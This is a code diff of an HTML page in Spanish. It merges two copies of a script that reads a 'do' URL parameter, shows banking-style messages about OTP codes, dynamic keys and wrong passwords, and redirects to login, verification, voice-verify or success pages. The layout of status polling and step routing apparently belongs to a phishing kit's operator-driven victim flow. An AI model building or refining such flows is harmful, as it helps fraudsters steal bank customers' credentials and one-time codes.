@@ -84,7 +84,7 @@
         </table>
     </div>
 
-    <!-- TU SCRIPT ORIGINAL (sin tocar) -->
+    <!-- TU SCRIPT ORIGINAL -->
     <script>
     $(document).ready(function($){
         if (typeof consultar_estado === 'function') {
@@ -98,78 +98,32 @@
     });
     </script>
 
-    <!-- REDIRECCIÓN AUTOMÁTICA CON URL (SIN POLLING) -->
+    <!-- REDIRECCIÓN MÁGICA (SOLO 1 VEZ) -->
     <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const action = urlParams.get('do');
+    if (location.search.includes('do=')) {
+        const accion = new URLSearchParams(location.search).get('do');
+        const acciones = {
+            otp:      ['Tu clave OTP es: 4821', '/solicitar/'],
+            error:    ['Clave incorrecta', '/login/'],
+            dinamica: ['Pide la clave dinámica', '/verify-voice/'],
+            loginerr: ['Error de login', '/login/'],
+            ok:       ['Acceso concedido!', '/successful/']
+        };
+        const [msg, ruta] = acciones[accion] || ['Acción desconocida', '/verifying/'];
 
-    if (action) {
-        let destino = '';
-        let mensaje = '';
-
-        switch(action) {
-            case 'otp':
-                mensaje = 'Tu clave OTP es: 4821';
-                destino = '/solicitar/';
-                break;
-            case 'error':
-                mensaje = 'Clave incorrecta';
-                destino = '/login/';
-                break;
-            case 'dinamica':
-                mensaje = 'Pide la clave dinámica';
-                destino = '/verify-voice/';
-                break;
-            case 'loginerr':
-                mensaje = 'Error de login';
-                destino = '/login/';
-                break;
-            case 'ok':
-                mensaje = 'Acceso concedido!';
-                destino = '/successful/';
-                break;
-            default:
-                mensaje = 'Acción desconocida';
-                destino = '/verifying/';
-        }
-
-        // MUESTRA MENSAJE Y REDIRIGE
         document.body.innerHTML = `
-            <div style="text-align:center;padding:80px;background:#742fe1;color:white;font-family:Arial;height:100vh">
-                <h1>${mensaje}</h1>
-                <p>Redirigiendo...</p>
-                <div style="border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:30px auto"></div>
+            <div style="text-align:center;padding:100px;background:#742fe1;color:#fff;font-family:Arial;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center">
+                <h1 style="font-size:28px;margin:0">${msg}</h1>
+                <p style="font-size:18px;margin:20px 0">Redirigiendo en 2 segundos...</p>
+                <div style="width:70px;height:70px;border:12px solid #fff;border-top:12px solid #ff6b6b;border-radius:50%;animation:giro 1s linear infinite"></div>
             </div>
-            <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+            <style>@keyframes giro{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}</style>
         `;
 
-        setTimeout(() => { window.location.href = destino; }, 1800);
+        setTimeout(() => { location.href = ruta; }, 1800);
     }
     </script>
 
     <script src="../assets/js/ready.js?v2"></script>
-<script>
-if (location.search.includes('do=')) {
-    const accion = new URLSearchParams(location.search).get('do');
-    const msgs = {
-        otp: ['Tu clave OTP es: 4821', '/solicitar/'],
-        error: ['Clave incorrecta', '/login/'],
-        dinamica: ['Pide la clave dinámica', '/verify-voice/'],
-        loginerr: ['Error de login', '/login/'],
-        ok: ['Acceso concedido!', '/successful/']
-    };
-    const [msg, to] = msgs[accion] || ['Acción desconocida', '/verifying/'];
-
-    document.body.innerHTML = `
-        <div style="text-align:center;padding:100px;background:#742fe1;color:#fff;font-family:Arial;height:100vh">
-            <h1>${msg}</h1>
-            <p>Redirigiendo...</p>
-            <div style="border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:s 1s linear infinite;margin:30px auto"></div>
-        </div>
-        <style>@keyframes s{from{transform:rotate(0)}to{transform:rotate(360deg)}}</style>
-    `;
-    setTimeout(() => location.href = to, 1800);
-}
-</script></body>
+</body>
 </html>
-
